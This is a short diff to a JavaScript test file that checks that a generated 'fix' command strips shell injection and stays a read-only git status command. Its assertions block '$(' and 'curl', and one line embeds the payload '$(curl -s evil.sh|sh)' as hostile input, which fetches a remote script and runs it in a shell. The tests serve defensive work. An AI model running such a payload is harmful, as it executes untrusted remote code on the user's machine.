@@ -31,6 +31,8 @@ describe('unknownSchema', () => {
     expect(difference.fix).not.toContain('$(');
     expect(difference.fix).not.toContain('curl');
     expect(difference.fix).not.toContain('git checkout -- "*');
+    // Degraded, and still ONE command that runs — a read-only one, over a glob nothing chose.
+    expect(difference.fix).toStartWith('git status --short -- "*.snapshot.json"   # ');
     // Still reported, and still readable: the cause is prose, and nobody pastes prose.
     expect(difference.cause).toContain('$(curl -s evil.sh|sh)');
   });
